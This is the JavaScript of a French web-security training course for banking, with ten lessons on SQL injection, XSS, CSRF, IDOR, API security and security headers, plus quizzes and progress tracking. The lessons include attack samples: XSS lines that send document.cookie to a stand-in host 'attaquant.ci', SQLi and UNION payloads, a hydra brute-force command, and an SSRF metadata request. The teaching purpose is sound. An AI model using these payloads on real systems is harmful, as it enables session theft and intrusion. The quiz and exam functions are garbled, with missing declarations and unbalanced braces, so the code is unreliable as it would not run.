<script>
window.addEventListener('error', function(e) {
  var el = document.getElementById('err');
  if (el) { el.style.display = 'block'; el.textContent = 'ERREUR: ' + e.message; }
});

var KEY = 'mdpc_v53';
var state = { currentUser: null, users: {} };
try { var raw = localStorage.getItem(KEY); if (raw) state = JSON.parse(raw); } catch (e) {}

function save() { try { localStorage.setItem(KEY, JSON.stringify(state)); } catch (e) {} header(); }
function user() { return state.currentUser ? state.users[state.currentUser] : null; }
function mkUser(n) { return { name: n, done: {}, certs: [], examens: {}, jours: {}, created: new Date().toISOString().slice(0,10) }; }
function today() { return new Date().toISOString().slice(0,10); }

function countDone(lvl) {
  var u = user(); if (!u) return 0;
  var c = 0, p = lvl + '_';
  for (var k in u.done) { if (k.indexOf(p) === 0 && u.done[k]) c++; }
  return c;
}
function isComplete(lvl) { return countDone(lvl) >= 10; }
function isUnlocked(lvl) { if (lvl === 1) return true; return isComplete(lvl - 1); }

function simulate() {
  var u = user(); if (!u) return;
  for (var i = 1; i <= 10; i++) { u.done['1_'+i]=true; u.done['2_'+i]=true; u.done['3_'+i]=true; u.done['4_'+i]=true; }
  save();
  alert('N1-N4 simulés. Niveau 5 débloqué !');
  route();
}

function login() {
  var el = document.getElementById('loginName'); if (!el) return;
  var n = el.value.trim(); if (!n) { alert('Entre ton prénom'); return; }
  var k = n.toLowerCase().replace(/\s+/g, '_');
  if (!state.users[k]) state.users[k] = mkUser(n);
  state.currentUser = k; save(); go('home');
}
function logout() { state.currentUser = null; save(); go('login'); }
function go(h) { location.hash = h; }

/* ============================================================
   10 DÉFIS — contenu ultra-court pour éviter la troncature
   ============================================================ */
var DEFIS = [
{id:1, titre:"Introduction à la sécurité web", intro:"Le web est la surface d attaque la plus vaste. Comprendre son architecture est le point de départ.",
cours:"<h3>Le trio du web</h3><p>Toute app web repose sur <strong>client</strong> (navigateur) + <strong>serveur</strong> (Apache/Nginx) + <strong>base de données</strong>.</p><h3>Cycle d une requête</h3><ol><li>Client envoie HTTP (GET, POST)</li><li>Serveur → backend → BDD</li><li>Réponse HTML/JSON au client</li></ol><h3>Surface d attaque</h3><ul><li><strong>Navigateur</strong> — XSS, extensions</li><li><strong>Réseau</strong> — MITM, DNS spoofing</li><li><strong>Serveur</strong> — configs faibles</li><li><strong>App</strong> — injections, auth faible, IDOR</li><li><strong>BDD</strong> — SQLi, accès direct</li><li><strong>API</strong> — tokens faibles</li></ul><div class=\"box\">Une app web = une banque avec plusieurs portes. Chaque porte = surface d attaque.</div><div class=\"bank\">Apps bancaires auditées 24/7. Une faille = millions de pertes.</div><div class=\"warn\">HTTPS protège le transport, PAS contre SQLi, XSS, IDOR.</div>",
cas:"<h3>Cas 1 — Reconnaissance</h3><p>Auditer portail.banque.ci avec autorisation.</p><ol><li>curl -I https://portail.banque.ci (headers)</li><li>ffuf/dirb pour endpoints</li><li>Chercher /.env, /.git/config, /admin</li></ol><h3>Cas 2 — Signes faiblesse</h3><ul><li>Server: Apache/2.2.15 = 2010</li><li>Pas de Content-Security-Policy</li><li>Cookie sans Secure ni HttpOnly</li></ul><h3>Cas 3 — Sous-domaines</h3><p>crt.sh révèle m.banque.ci, api.banque.ci, test.banque.ci. Test/dev = plus vulnérables.</p>",
quiz:[
{q:'Une app web repose sur ?',o:['Client seul','Client + serveur + BDD','Serveur seul','BDD seule'],c:1,e:'Trio.'},
{q:'HTTPS protège contre ?',o:['SQLi','XSS','MITM transport','IDOR'],c:2,e:'Transport.'}
]},

{id:2, titre:"OWASP Top 10", intro:"Référence mondiale des failles web. Indispensable.",
cours:"<h3>Les 10 failles (2021)</h3><table><tr><th>#</th><th>Faille</th></tr><tr><td>A01</td><td>Broken Access Control</td></tr><tr><td>A02</td><td>Cryptographic Failures</td></tr><tr><td>A03</td><td>Injection</td></tr><tr><td>A04</td><td>Insecure Design</td></tr><tr><td>A05</td><td>Security Misconfiguration</td></tr><tr><td>A06</td><td>Vulnerable Components</td></tr><tr><td>A07</td><td>Authentication Failures</td></tr><tr><td>A08</td><td>Data Integrity Failures</td></tr><tr><td>A09</td><td>Logging Failures</td></tr><tr><td>A10</td><td>SSRF</td></tr></table><h4>A01 — Broken Access Control</h4><p>L app ne vérifie pas assez les droits. Faille #1.</p><h4>A03 — Injection</h4><p>Code malveillant via entrée non filtrée : SQLi, command injection. Cause : concaténation.</p><h4>A05 — Misconfiguration</h4><p>Debug en prod, admin par défaut, .env exposé.</p><h4>A06 — Vulnerable Components</h4><p>Log4j, Spring4Shell, vieux jQuery.</p><h4>A07 — Authentication Failures</h4><p>Mdp faibles, pas de MFA, brute force.</p><h4>A10 — SSRF</h4><p>Serveur forcé de requêter une URL interne (169.254.169.254 = AWS metadata).</p><div class=\"box\">Code de la route du développeur. Ignorer = rouler en sens inverse.</div><div class=\"bank\">Les 3 plus critiques en banque : A01, A03, A07.</div>",
cas:"<h3>Cas 1 — A01 (IDOR)</h3><p>/releve?id=123 → changer id=124. Si on voit le relevé d un autre → IDOR.</p><p>Correction : vérifier que l utilisateur connecté est propriétaire.</p><h3>Cas 2 — A05 (misconfig)</h3><pre>curl https://portail.banque.ci/.env\ncurl https://portail.banque.ci/.git/config</pre><p>Réponse 200 avec contenu → critique.</p><h3>Cas 3 — A10 (SSRF)</h3><p>Formulaire url=http://169.254.169.254/latest/meta-data/ → SSRF confirmé sur AWS.</p>",
quiz:[
{q:'Faille #1 OWASP 2021 ?',o:['SQLi','Broken Access Control','XSS','CSRF'],c:1,e:'A01.'},
{q:'Log4Shell = ?',o:['A01','A03','A06','A10'],c:2,e:'Composant obsolète.'}
]},

{id:3, titre:"Injection SQL", intro:"La faille la plus emblématique. Permet de lire, modifier, supprimer une BDD.",
cours:"<h3>Principe</h3><p><strong>SQLi</strong> = entrée utilisateur concaténée dans une requête SQL sans échappement.</p><h3>Exemple vulnérable</h3><pre>SELECT * FROM users WHERE login='$login' AND password='$password'</pre><p>Si login = <code>' OR '1'='1</code>, la condition devient toujours vraie.</p><h3>Types</h3><ul><li><strong>In-band</strong> — résultat dans la réponse</li><li><strong>Union-based</strong> — UNION pour joindre autre table</li><li><strong>Blind</strong> — vrai/faux ou temps</li><li><strong>Out-of-band</strong> — exfiltration DNS</li></ul><h3>Payloads</h3><pre>' OR 1=1 --\n' UNION SELECT user, password FROM mysql.user --</pre><h3>Correction — requêtes préparées</h3><pre>$stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE login=? AND password=?');\n$stmt-&gt;execute([$login, $password]);</pre><p>Le <code>?</code> sépare code et données.</p><div class=\"box\">Formulaire papier sans protection. Un malin ajoute du code.</div><div class=\"warn\">addslashes ne suffit PAS. Requêtes préparées obligatoires.</div>",
cas:"<h3>Cas 1 — Détecter</h3><pre>?id=1'         → erreur SQL ?\n?id=1 AND 1=1  → normal\n?id=1 AND 1=2  → vide ? (blind)\n?id=1' OR '1'='1 → tous les résultats ?</pre><h3>Cas 2 — UNION</h3><pre>?id=1 ORDER BY 1 --\n?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables --</pre><h3>Cas 3 — Corriger</h3><pre>// VULNÉRABLE\n$sql = \"SELECT * FROM user WHERE id=\" . $_GET['id'];</pre><pre>// SÉCURISÉ\n$stmt = $pdo-&gt;prepare('SELECT * FROM user WHERE id = ?');\n$stmt-&gt;execute([$_GET['id']]);</pre>",
quiz:[
{q:'Cause SQLi ?',o:['Serveur lent','Concaténation','Mdp faible','Certificat'],c:1,e:'Concaténation.'},
{q:'Protection ?',o:['WAF','Requêtes préparées','Échapper','Renommer'],c:1,e:'Préparées.'}
]},

{id:4, titre:"XSS — Cross-Site Scripting", intro:"Exécuter du JavaScript dans le navigateur d un autre utilisateur. Faille la plus répandue.",
cours:"<h3>Principe</h3><p><strong>XSS</strong> = JavaScript malveillant injecté dans une page vue par un autre utilisateur.</p><h3>3 types</h3><h4>1. Stocké (persistant)</h4><p>Script stocké en BDD (commentaire, profil). S exécute pour CHAQUE visiteur. Le plus dangereux.</p><pre>&lt;script&gt;fetch('https://attaquant.ci/?c='+document.cookie)&lt;/script&gt;</pre><h4>2. Réfléchi</h4><p>Script reflété par le serveur. L attaquant envoie un lien piégé.</p><h4>3. DOM-based</h4><p>Script exécuté côté client, sans passer par le serveur.</p><h3>Impact</h3><ul><li>Voler cookie session (si pas HttpOnly)</li><li>Actions au nom de la victime</li><li>Faux formulaire login</li></ul><h3>Correction</h3><ul><li><strong>Échappement HTML</strong> : &amp;lt; → &amp;amp;lt; etc.</li><li><strong>CSP</strong> : Content-Security-Policy: default-src 'self'</li><li><strong>HttpOnly</strong> sur cookies</li><li><strong>Pas innerHTML</strong> — textContent ou DOMPurify</li></ul><div class=\"box\">Tableau public : quelqu un ajoute « donnez votre argent à Jean ».</div><div class=\"warn\">Filtrer &lt;script&gt; ne suffit PAS. Il y a &lt;img onerror&gt;, &lt;svg onload&gt;...</div>",
cas:"<h3>Cas 1 — Tester XSS réfléchi</h3><p>Chercher <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. Si popup → confirmé.</p><p>Tester aussi <code>&lt;img src=x onerror=alert(1)&gt;</code>.</p><h3>Cas 2 — XSS stocké (lab)</h3><pre>&lt;script&gt;new Image().src='https://attaquant.ci/log?c='+document.cookie&lt;/script&gt;</pre><h3>Cas 3 — Corriger</h3><pre>// VULNÉRABLE\nres.send('&lt;h1&gt;' + user.name + '&lt;/h1&gt;');</pre><pre>// SÉCURISÉ\nconst escapeHtml = require('escape-html');\nres.send('&lt;h1&gt;' + escapeHtml(user.name) + '&lt;/h1&gt;');</pre>",
quiz:[
{q:'Combien de types XSS ?',o:['1','2','3','4'],c:2,e:'Stocké, réfléchi, DOM.'},
{q:'HttpOnly ?',o:['Empêche JS','Chiffre','Signe','Envoie'],c:0,e:'document.cookie bloqué.'}
]},

{id:5, titre:"CSRF — Cross-Site Request Forgery", intro:"Forcer un utilisateur authentifié à exécuter une action non désirée.",
cours:"<h3>Principe</h3><p><strong>CSRF</strong> exploite le fait que le navigateur envoie automatiquement les cookies vers le domaine concerné.</p><h3>Scénario</h3><ol><li>Victime connectée à banque.ci</li><li>Visite site-pirate.ci qui contient :</li></ol><pre>&lt;img src=\"https://banque.ci/virement?to=attaquant&amp;amount=10000\"&gt;</pre><ol start=\"3\"><li>Le navigateur envoie la requête avec le cookie → virement exécuté</li></ol><h3>Correction — token CSRF</h3><p>Ajouter un <strong>token aléatoire unique</strong> dans chaque formulaire, vérifié côté serveur.</p><pre>&lt;input type=\"hidden\" name=\"csrf_token\" value=\"x8f3a2...\"&gt;</pre><h3>Autres protections</h3><ul><li><strong>SameSite=Strict</strong> sur cookies</li><li><strong>Vérifier Origin/Referer</strong></li><li><strong>Re-authentification</strong> pour actions sensibles</li><li><strong>Jamais d action en GET</strong></li></ul><h3>CSRF vs XSS</h3><table><tr><th>Critère</th><th>XSS</th><th>CSRF</th></tr><tr><td>Exécution</td><td>Code JS</td><td>Requête victime</td></tr><tr><td>Cible</td><td>Navigateur</td><td>Serveur</td></tr><tr><td>Protection</td><td>Échappement, CSP</td><td>Token, SameSite</td></tr></table><div class=\"box\">Un pickpocket glisse un papier sous votre main. Vous signez sans le voir.</div><div class=\"bank\">Virement en GET sans token = faille critique.</div>",
cas:"<h3>Cas 1 — Tester CSRF</h3><p>Vérifier présence d un champ <code>csrf_token</code>. Absent → probablement vulnérable.</p><h3>Cas 2 — Corriger (Flask)</h3><pre>from flask_wtf.csrf import CSRFProtect\napp = Flask(__name__)\nCSRFProtect(app)</pre><h3>Cas 3 — Cookie SameSite</h3><pre>Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict</pre><p>SameSite=Strict empêche l envoi depuis un autre domaine.</p>",
quiz:[
{q:'CSRF exploite ?',o:['SQLi','Confiance navigateur','Antivirus','Certificat'],c:1,e:'Cookies auto.'},
{q:'Protection ?',o:['Token CSRF','HTTPS','Antivirus','WAF'],c:0,e:'Token unique.'}
]},

{id:6, titre:"Authentification et sessions", intro:"Porte d entrée de toute app. Une faille = tout tombe.",
cours:"<h3>Auth vs Autorisation</h3><ul><li><strong>Authentification</strong> — qui es-tu ?</li><li><strong>Autorisation</strong> — que peux-tu faire ?</li></ul><h3>Méthodes</h3><ul><li>Mot de passe</li><li>MFA (TOTP, biométrie)</li><li>OAuth2 / OIDC</li><li>Passkeys / FIDO2</li></ul><h3>Failles A07</h3><ul><li>Mdp faibles (123456)</li><li>Pas de rate limiting</li><li>Énumération comptes</li><li>Reset mdp faible</li><li>Session non invalidée</li><li>Session dans URL</li><li>Cookie sans Secure</li></ul><h3>Sessions vs JWT</h3><table><tr><th>Critère</th><th>Session</th><th>JWT</th></tr><tr><td>Stockage</td><td>Serveur</td><td>Stateless</td></tr><tr><td>Révocation</td><td>Facile</td><td>Difficile</td></tr></table><h3>Bonnes pratiques</h3><ul><li>Mdp 12+ caractères</li><li>Argon2id / bcrypt (JAMAIS MD5)</li><li>MFA TOTP ou FIDO2</li><li>Rate limit 5/15min</li><li>Message générique « identifiants invalides »</li><li>Cookie Secure + HttpOnly + SameSite=Strict</li><li>Logout serveur</li><li>JWT : 15 min + refresh token</li></ul><div class=\"box\">Videur boîte de nuit : vérifie carte (auth), autorise VIP/bar (autorisation).</div><div class=\"bank\">Banques imposent MFA sur toutes connexions client.</div>",
cas:"<h3>Cas 1 — Brute force</h3><p>Tester 10 logins faux. Réponse rapide = pas de rate limiting.</p><pre>hydra -l admin -P passwords.txt banque.ci https-post-form \"/login:user=^USER^&amp;pass=^PASS^:F=incorrect\"</pre><h3>Cas 2 — Énumération</h3><p>admin/fake → « mdp incorrect ». fakeuser/fake → « user inconnu ». Différent = énumération.</p><p>Correction : « identifiants invalides ».</p><h3>Cas 3 — Sécuriser session</h3><pre>Set-Cookie: sessionid=abc; HttpOnly; Secure; SameSite=Strict; Max-Age=1800</pre>",
quiz:[
{q:'Auth = ?',o:['Que peux-tu ?','Qui es-tu ?','Où ?','Quand ?'],c:1,e:'Identité.'},
{q:'Hash recommandé ?',o:['MD5','SHA-1','Argon2id','Base64'],c:2,e:'Argon2id.'}
]},

{id:7, titre:"Contrôle d accès — IDOR", intro:"Faille #1 OWASP. Accéder aux données d autres utilisateurs.",
cours:"<h3>Niveaux de contrôle</h3><ul><li><strong>Vertical</strong> — user vs admin</li><li><strong>Horizontal</strong> — user A vs user B</li></ul><h3>IDOR</h3><p>Identifiant prévisible dans l URL, SANS vérifier la propriété.</p><pre>GET /facture?id=1234</pre><p>Attaquant teste id=1235, id=1236, id=1. Si voit factures d autres → IDOR.</p><h3>Vertical privilege escalation</h3><ul><li>/admin/panel accessible directement</li><li>Paramètre isAdmin=true modifiable</li><li>JWT role:user modifiable</li></ul><h3>Masquage côté client</h3><p>Bouton masqué en CSS mais endpoint API accessible.</p><h3>Correction</h3><pre>if (facture.userId !== req.session.userId) return 403;</pre><p>Et utiliser des UUID v4 plutôt que des IDs séquentiels.</p><div class=\"box\">Hôtel : clé 101 qui ouvre 102 = IDOR.</div><div class=\"bank\">IDOR = relevés, virements, données clients exposés.</div><div class=\"warn\">Cacher bouton CSS ne protège rien.</div>",
cas:"<h3>Cas 1 — Détecter IDOR</h3><ol><li>Compte A : /api/user/123/profile</li><li>Compte B : /api/user/124/profile (124 = A)</li><li>B reçoit données A → IDOR</li></ol><p>Tester aussi : id=1, id=0, id=-1, id=null.</p><h3>Cas 2 — Vertical escalation</h3><ol><li>Chercher /admin dans code JS</li><li>Tester avec compte normal : GET /admin/users</li><li>Réponse 200 → faille</li></ol><h3>Cas 3 — Corriger</h3><pre>// VULNÉRABLE\napp.get('/facture/:id', async (req, res) =&gt; {\n  const f = await db.facture.findById(req.params.id);\n  res.json(f);\n});</pre><pre>// SÉCURISÉ\napp.get('/facture/:id', async (req, res) =&gt; {\n  const f = await db.facture.findById(req.params.id);\n  if (!f) return res.status(404).end();\n  if (f.userId !== req.user.id) return res.status(403).end();\n  res.json(f);\n});</pre>",
quiz:[
{q:'IDOR = ?',o:['Injection','Contrôle accès','Crypto','Réseau'],c:1,e:'Accès non autorisé.'},
{q:'Cacher bouton CSS ?',o:['Protège','Ne protège rien','Chiffre','Signe'],c:1,e:'Requêtes directes.'}
]},

{id:8, titre:"Sécurité des API", intro:"API partout : mobiles, SPA, microservices. Moins protégées que le web.",
cours:"<h3>API REST</h3><table><tr><th>Verbe</th><th>Action</th></tr><tr><td>GET</td><td>Lire</td></tr><tr><td>POST</td><td>Créer</td></tr><tr><td>PUT</td><td>Remplacer</td></tr><tr><td>PATCH</td><td>Modifier</td></tr><tr><td>DELETE</td><td>Supprimer</td></tr></table><h3>Failles spécifiques</h3><h4>1. Pas d authentification</h4><p>GET /api/users sans token → toute la base.</p><h4>2. BOLA (Broken Object Level Auth)</h4><p>User authentifié accède aux données d autres. #1 failles API.</p><h4>3. Mass Assignment</h4><p>Endpoint attend {name, email} mais accepte {role:admin}.</p><pre>POST /api/users\n{\"name\":\"Jean\",\"role\":\"admin\"}</pre><h4>4. Pas de rate limiting</h4><h4>5. Exposition excessive</h4><p>GET /api/users/123 retourne mdp hashé, tokens.</p><h4>6. CORS mal configuré</h4><p>Access-Control-Allow-Origin: * → tout site appelle l API.</p><h3>Correction</h3><ul><li>Auth obligatoire</li><li>BOLA vérifiée serveur</li><li>Whitelist champs</li><li>Rate limiting IP + user</li><li>DTO (pas données sensibles)</li><li>CORS restrictif</li></ul><div class=\"box\">Service au comptoir : sans badge (token), rien ne sort.</div><div class=\"bank\">BOLA + mass assignment = les plus recherchées en API bancaire.</div>",
cas:"<h3>Cas 1 — Tester auth</h3><pre>curl https://api.banque.ci/users</pre><p>Sans token : 401 attendu. Si 200 → faille critique.</p><h3>Cas 2 — Mass assignment</h3><p>Burp : ajouter \"role\":\"admin\" dans body JSON. Si rôle change en base → faille.</p><p>Tester aussi \"isAdmin\":true, \"balance\":999999.</p><h3>Cas 3 — Corriger</h3><pre>// VULNÉRABLE\napp.post('/api/users', async (req, res) =&gt; {\n  const u = await User.create(req.body);\n  res.json(u);\n});</pre><pre>// SÉCURISÉ\napp.post('/api/users', authenticate, async (req, res) =&gt; {\n  const { name, email } = req.body;\n  const u = await User.create({ name, email, role: 'user' });\n  res.json({ id: u.id, name: u.name, email: u.email });\n});</pre>",
quiz:[
{q:'BOLA ?',o:['Faille autorisation API','Crypto','Protocole','Virus'],c:0,e:'Broken Object Level Auth.'},
{q:'Mass assignment ?',o:['Beaucoup requêtes','Champs non prévus','DNS','Cookie'],c:1,e:'Injecter champs.'}
]},

{id:9, titre:"Cookies et headers de sécurité", intro:"Première ligne de défense. Bien configurés, ils bloquent 80% des attaques front.",
cours:"<h3>Cookies sécurisés</h3><table><tr><th>Attribut</th><th>Effet</th></tr><tr><td>Secure</td><td>HTTPS uniquement</td></tr><tr><td>HttpOnly</td><td>Inaccessible JS (anti-XSS)</td></tr><tr><td>SameSite=Strict</td><td>Pas depuis autre domaine (anti-CSRF)</td></tr><tr><td>Max-Age</td><td>Durée de vie</td></tr></table><h4>Cookie parfait</h4><pre>Set-Cookie: sessionid=abc; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=1800</pre><h3>Headers de sécurité</h3><h4>1. Content-Security-Policy</h4><pre>Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.banque.ci</pre><h4>2. Strict-Transport-Security</h4><pre>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</pre><h4>3. X-Frame-Options</h4><pre>X-Frame-Options: DENY</pre><h4>4. X-Content-Type-Options</h4><pre>X-Content-Type-Options: nosniff</pre><h4>5. Referrer-Policy</h4><pre>Referrer-Policy: strict-origin-when-cross-origin</pre><h4>6. Permissions-Policy</h4><pre>Permissions-Policy: camera=(), microphone=(), geolocation=()</pre><div class=\"box\">Règles de sécurité d un immeuble. CSP = liste autorisés. HSTS = entrée principale obligatoire.</div><div class=\"bank\">Banques doivent avoir CSP + HSTS + X-Frame-Options + cookies Secure/HttpOnly/SameSite.</div><div class=\"warn\">CSP avec * = aucune protection.</div>",
cas:"<h3>Cas 1 — Auditer</h3><pre>curl -I https://banque.ci</pre><p>Ou securityheaders.com. Score A+ exigé banques.</p><h3>Cas 2 — Cookie faible</h3><pre>Set-Cookie: sessionid=abc123</pre><p>❌ Pas Secure, pas HttpOnly, pas SameSite. Correction :</p><pre>Set-Cookie: sessionid=abc; Secure; HttpOnly; SameSite=Strict; Max-Age=1800</pre><h3>Cas 3 — CSP Nginx</h3><pre>add_header Content-Security-Policy \"default-src 'self'; script-src 'self' https://cdn.banque.ci; frame-ancestors 'none'\" always;\nadd_header Strict-Transport-Security \"max-age=31536000\" always;\nadd_header X-Frame-Options \"DENY\" always;\nadd_header X-Content-Type-Options \"nosniff\" always;</pre>",
quiz:[
{q:'HttpOnly ?',o:['Empêche envoi','Empêche JS','Chiffre','Signe'],c:1,e:'Anti-XSS.'},
{q:'HSTS ?',o:['HTTP','HTTPS','Cookies','Cache'],c:1,e:'Force HTTPS.'}
]},

{id:10, titre:"Sécuriser une app complète", intro:"Synthèse : auditer, sécuriser et maintenir une application bancaire.",
cours:"<h3>Défense en profondeur</h3><ol><li><strong>Réseau</strong> — pare-feu, WAF, DDoS</li><li><strong>Transport</strong> — TLS 1.2+, HSTS</li><li><strong>Serveur</strong> — patch, hardening</li><li><strong>App</strong> — validation, auth, autorisation</li><li><strong>BDD</strong> — moindre privilège, chiffrement</li><li><strong>Client</strong> — CSP, cookies sécurisés</li><li><strong>Monitoring</strong> — logs, alertes, SIEM</li></ol><h3>Checklist</h3><h4>Auth</h4><ul><li>MFA obligatoire</li><li>Mdp 12+, Argon2id</li><li>Rate limit 5/15min</li><li>Message générique</li><li>Cookie Secure+HttpOnly+SameSite</li><li>Expiration 30min</li><li>Logout serveur</li></ul><h4>Autorisation</h4><ul><li>Vérif propriété sur CHAQUE endpoint</li><li>Check admin serveur</li><li>UUID > IDs séquentiels</li></ul><h4>Injections</h4><ul><li>Requêtes préparées partout</li><li>Validation whitelist</li><li>Pas d erreurs SQL en prod</li></ul><h4>XSS</h4><ul><li>Échappement HTML</li><li>CSP stricte</li><li>HttpOnly cookies</li></ul><h4>CSRF</h4><ul><li>Token sur POST</li><li>SameSite=Strict</li><li>Vérif Origin</li></ul><h4>API</h4><ul><li>Auth obligatoire</li><li>BOLA vérifiée</li><li>Whitelist champs</li><li>Rate limiting</li></ul><h4>Monitoring</h4><ul><li>Logs toutes requêtes</li><li>Alertes SIEM</li><li>Rétention 6-12 mois (BCEAO, PCI-DSS)</li></ul><div class=\"box\">Sécuriser une app = sécuriser une banque physique.</div><div class=\"bank\">App bancaire conforme = toutes ces cases cochées.</div><div class=\"warn\">WAF ne remplace PAS le code sécurisé.</div>",
cas:"<h3>Cas 1 — Audit 7 étapes</h3><ol><li>Reconnaissance</li><li>Auth (brute force, MFA, reset)</li><li>Autorisation (IDOR, admin)</li><li>Injections</li><li>Session</li><li>API</li><li>Headers &amp; TLS</li></ol><h3>Cas 2 — Rapport pentest</h3><ol><li>Résumé exécutif</li><li>Méthodologie</li><li>Vulns par sévérité</li><li>Preuves</li><li>Recommandations</li><li>Annexes</li></ol><h3>Cas 3 — WAF Cloudflare</h3><ol><li>Compte Cloudflare</li><li>DNS → Cloudflare</li><li>« I m Under Attack »</li><li>Règles OWASP managées</li><li>Rate limiting</li><li>SSL Strict + HSTS</li></ol>",
quiz:[
{q:'Défense en profondeur ?',o:['Une protection','Plusieurs couches','Un mdp','Antivirus'],c:1,e:'Empiler.'},
{q:'Rétention logs BCEAO ?',o:['1 jour','1 semaine','6-12 mois','10 ans'],c:2,e:'BCEAI/PCI-DSS.'}
]}
];

function validerQuiz(id) {

    for (var li = 0; li < labels.length; li++) { labels[li].classList.remove('ok','ko'); }

    if (sel && parseInt(sel.value) === q.c) { correct++; labels[q.c].classList.add('ok'); }

  }

function validerExamen(type) {

    var ex = document.getElementById('exexp' + qi); if (ex) ex.style.display = 'block';
    if (sel && parseInt(sel.value) === q.c) { correct++; labels[q.c].classList.add('ok'); }
    else { labels[q.c].classList.add('ok'); if (sel) labels[parseInt(sel.value)].classList.add('ko'); }
  }
  var pct = Math.round(correct / e.qs.length * 100);
  var req = type === 'final' ? 80 : 60;
  var pass = pct >= req;
  if (pass) { u.examens['5_' + type] = today(); save(); }

}

function b64(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch(e) { return ''; } }
function unb64(b) { try { return decodeURIComponent(escape(atob(b.replace(/\s/g,'')))); } catch(e) { return null; } }
function exportCode() { return b64(JSON.stringify(state)); }
function importCode(c) { var j = unb64(c.trim()); if (!j) return false; try { var d = JSON.parse(j); if (!d) return false; state = Object.assign({}, state, d); save(); return true; } catch(e) { return false; } }
function dlBackup() { var b = new Blob([JSON.stringify(state, null, 2)], {type:'application/json'}); var url = URL.createObjectURL(b); var a = document.createElement('a'); a.href = url; a.download = 'mdpc-n5-' + today() + '.json'; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url); }
function readFile(input) { var f = input.files[0]; if (!f) return; var r = new FileReader(); r.onload = function(e) { try { var d = JSON.parse(e.target.result); state = Object.assign({}, state, d); save(); alert('Restauré !'); route(); } catch(err) { alert('Invalide'); } }; r.readAsText(f); }

function applyCode() { var c = document.getElementById('si').value; if (!c.trim()) { alert('Colle un code.'); return; } if (importCode(c)) { alert('Restauré !'); route(); } else alert('Code invalide.'); }

function route() {
  try {
    header();
    if (!state.currentUser) { renderLogin(); return; }
    if (!isUnlocked(5)) { renderLocked(); return; }
    var h = (location.hash || '#home').slice(1);
    var p = h.split('/');
    if (p[0] === 'home' || p[0] === '') return renderHome();
    if (p[0] === 'defi' && p[1]) return renderDefi(parseInt(p[1]));
    if (p[0] === 'certif') return renderCertif();
    if (p[0] === 'cv') return renderCV();
    if (p[0] === 'stats') return renderStats();
    if (p[0] === 'jobs') return renderJobs();
    if (p[0] === 'examens') return renderExamens();
    if (p[0] === 'examen' && p[1]) return renderExamen(p[1]);
    if (p[0] === 'certs') return renderCerts();
    if (p[0] === 'sync') return renderSync();
    renderHome();
  } catch(e) {
    console.error('Route error:', e);
    document.getElementById('app').innerHTML = '<div class="card"><h2 style="color:#ef4444">Erreur</h2><p style="color:#ef4444">' + e.message + '</p><pre style="color:#fca5a5;font-size:.8em;white-space:pre-wrap">' + (e.stack || '') + '</pre></div>';
  }
}
window.addEventListener('hashchange', route);
try { route(); } catch(e) {
  document.getElementById('app').innerHTML = '<div class="card"><h2 style="color:#ef4444">Erreur init</h2><p style="color:#ef4444">' + e.message + '</p></div>';
}
</script>
